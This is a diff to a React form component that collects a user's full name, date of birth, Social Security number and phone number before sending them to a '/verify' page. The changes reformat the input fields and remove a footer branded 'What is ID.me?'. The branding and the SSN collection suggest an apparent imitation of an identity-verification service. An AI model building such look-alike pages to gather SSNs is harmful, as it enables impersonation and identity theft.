@@ -1,8 +1,6 @@
 import React, { useState } from "react";
 import id from "../assets/id.png";
 import download from "../assets/download2.png";
-import DatePicker from "react-datepicker";
-import "react-datepicker/dist/react-datepicker.css";
 import { useNavigate } from "react-router-dom";
 
 const Details = () => {
@@ -11,27 +9,27 @@ const Details = () => {
     name: false,
     dob: false,
     ssn: false,
-    phone: false
+    phone: "",
   });
   const [data, setData] = useState({});
   const navigate = useNavigate();
 
-
   const [formData, setFormData] = useState({
     name: "",
-    dob: null,
+    dob: "",
     ssn: "",
     phone: "",
   });
 
-  const handleDateChange = (date) => {
+  const handleDateChange = (e) => {
+    const formattedDate = e.target.value;
     setFormData((prev) => ({
       ...prev,
-      dob: date,
+      dob: formattedDate,
     }));
 
-    if (currentErrorField === 'dob') {
-      setErrors((prev) => ({ ...prev, dob: !date }));
+    if (currentErrorField === "dob") {
+      setErrors((prev) => ({ ...prev, dob: !formattedDate.trim() }));
     }
   };
 
@@ -49,15 +47,16 @@ const Details = () => {
 
   const validateField = (fieldName) => {
     let isValid = false;
-    
-    if (fieldName === 'name') {
-      isValid = formData.name.trim() !== '';
-    } else if (fieldName === 'dob') {
-      isValid = formData.dob !== null;
-    } else if (fieldName === 'ssn') {
-      isValid = formData.ssn.trim() !== '';
-    } else if (fieldName === 'phone') {
-      isValid = formData.phone.trim() !== '';
+
+    if (fieldName === "name") {
+      isValid = formData.name.trim() !== "";
+    } else if (fieldName === "dob") {
+      isValid = formData.dob.trim() !== "";
+    } else if (fieldName === "ssn") {
+      isValid = formData.ssn.trim() !== "";
+    } else if (fieldName === "phone") {
+      const digits = formData.phone.replace(/\D/g, "");
+      isValid = digits.length === 10;
     }
 
     setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
@@ -66,32 +65,31 @@ const Details = () => {
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    
+
     // Check fields in order
-    if (!validateField('name')) {
-      setCurrentErrorField('name');
-      return;
-    }
-    
-    if (!validateField('dob')) {
-      setCurrentErrorField('dob');
-      return;
-    }
-    
-    if (!validateField('ssn')) {
-      setCurrentErrorField('ssn');
-      return;
-    }
-    
-    if (!validateField('phone')) {
-      setCurrentErrorField('phone');
+    if (!validateField("name")) {
+      setCurrentErrorField("name");
       return;
     }
 
+    if (!validateField("dob")) {
+      setCurrentErrorField("dob");
+      return;
+    }
+
+    if (!validateField("ssn")) {
+      setCurrentErrorField("ssn");
+      return;
+    }
+
+    if (!validateField("phone")) {
+      setCurrentErrorField("phone");
+      return;
+    }
 
     // If all fields are valid
     setCurrentErrorField(null);
-    console.log('Form submitted:', formData);
+    console.log("Form submitted:", formData);
     navigate("/verify");
   };
 
@@ -115,13 +113,17 @@ const Details = () => {
         >
           {/* Full Name */}
           <div className="w-full">
-            <label className="text-md font-semibold mb-2 block">Full Name</label>
+            <label className="text-md font-semibold mb-2 block">
+              Full Name
+            </label>
             <input
               name="name"
               type="text"
               value={formData.name}
               onChange={handleChange}
-              onBlur={() => currentErrorField === 'name' && validateField('name')}
+              onBlur={() =>
+                currentErrorField === "name" && validateField("name")
+              }
               className={`w-full px-4 py-2 border-2 border-gray-500 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                 errors.name
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
@@ -129,45 +131,52 @@ const Details = () => {
               }`}
             />
             {errors.name && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
+              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
             )}
           </div>
 
           {/* Date of Birth */}
-          <div className=" flex w-full space-x-1">
-            <label className="text-md font-semibold mb-2 block">Date of Birth</label>
-            <DatePicker
-              selected={formData.dob}
-              onChange={handleDateChange}
-              onBlur={() => currentErrorField === 'dob' && validateField('dob')}
+          <div className="w-full space-x-1">
+            <label className="text-md font-semibold mb-2 block">
+              Date of Birth
+            </label>
+            <input
               name="dob"
-              showMonthDropdown
-              showYearDropdown
-              dropdownMode="select"
-              maxDate={new Date()}
-              dateFormat="dd MM yyyy"
-             
-              className={`w-full px-4 py-2 border-2 rounded text-center tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
+              type="text"
+              placeholder="dd-mm-yyyy"
+              value={formData.dob || ""}
+              maxLength={10}
+              onChange={handleDateChange}
+              onBlur={() =>
+                currentErrorField === "dob" && validateField("dob")
+              }
+              className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                 errors.dob
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
                   : "border-gray-500 focus:ring-2 focus:ring-blue-700"
               }`}
             />
             {errors.dob && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
+              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
             )}
           </div>
 
           {/* SSN */}
           <div className="w-full">
-            <label className="text-md font-semibold mb-2 block">Social Security Number</label>
+            <label className="text-md font-semibold mb-2 block">
+              Social Security Number
+            </label>
             <input
               name="ssn"
-              type="number"
+              type="text"
               inputMode="numeric"
               value={formData.ssn}
-              onChange={handleChange}
-              onBlur={() => currentErrorField === 'ssn' && validateField('ssn')}
+              maxLength={9}
+              onChange={(e) => {
+                const raw = e.target.value.replace(/\D/g, "").slice(0, 9); // Only digits, max 9
+                setFormData((prev) => ({ ...prev, ssn: raw }));
+              }}
+              onBlur={() => currentErrorField === "ssn" && validateField("ssn")}
               className={`w-full px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                 errors.ssn
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
@@ -175,7 +184,7 @@ const Details = () => {
               }`}
             />
             {errors.ssn && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
+              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
             )}
           </div>
 
@@ -184,19 +193,46 @@ const Details = () => {
             <label className="text-md font-semibold mb-2 block">Phone Number</label>
             <input
               name="phone"
-              type="number"
+              type="text"
               inputMode="numeric"
               value={formData.phone}
-              onChange={handleChange}
-              onBlur={() => currentErrorField === 'phone' && validateField('phone')}
+              maxLength={12}
+              onChange={(e) => {
+                const rawDigits = e.target.value.replace(/\D/g, "").slice(0, 10);
+                let formatted = rawDigits;
+
+                if (rawDigits.length > 3 && rawDigits.length <= 6) {
+                  formatted = `${rawDigits.slice(0, 3)}-${rawDigits.slice(3)}`;
+                } else if (rawDigits.length > 6) {
+                  formatted = `${rawDigits.slice(0, 3)}-${rawDigits.slice(3, 6)}-${rawDigits.slice(6)}`;
+                }
+
+                setFormData((prev) => ({ ...prev, phone: formatted }));
+
+                if (currentErrorField === "phone") {
+                  setErrors((prev) => ({
+                    ...prev,
+                    phone:
+                      rawDigits.length !== 10 ? "invalid" : "",
+                  }));
+                }
+              }}
+              onBlur={() => {
+                const rawDigits = formData.phone.replace(/\D/g, "");
+                setErrors((prev) => ({
+                  ...prev,
+                  phone:
+                    rawDigits.length !== 10 ? "invalid" : "",
+                }));
+              }}
               className={`w-full px-4 py-2 border-2 rounded-md tracking-widest text-lg sm:text-xl focus:outline-none ${
                 errors.phone
                   ? "border-red-500 focus:ring-2 focus:ring-red-500"
                   : "border-gray-500 focus:ring-2 focus:ring-blue-700"
               }`}
             />
-            {errors.phone && (
-              <p className="text-red-500 text-sm mt-1">Fill out this field </p>
+            {errors.phone === "invalid" && (
+              <p className="text-red-500 text-sm mt-1">Phone number must be 10 digits</p>
             )}
           </div>
 
@@ -208,18 +244,6 @@ const Details = () => {
           </button>
         </form>
       </div>
-
-      {/* Footer */}
-      <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
-        <div className="underline text-blue-600 cursor-pointer">English</div>
-        <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
-          <span>What is ID.me?</span>
-          <span className="border-l border-black h-3" />
-          <span>Terms of Service</span>
-          <span className="border-l border-black h-3" />
-          <span>Privacy Policy</span>
-        </div>
-      </footer>
     </div>
   );
 };
